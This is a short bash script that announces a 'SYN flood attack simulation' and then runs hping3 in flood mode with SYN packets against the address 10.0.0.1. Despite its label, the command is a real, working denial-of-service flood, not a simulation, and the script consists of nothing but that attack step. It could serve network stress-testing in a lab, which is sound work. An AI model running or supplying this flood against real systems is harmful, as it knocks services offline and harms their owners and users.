#!/bin/bash

echo "Starting SYN flood attack simulation"

hping3 -S --flood -V 10.0.0.1

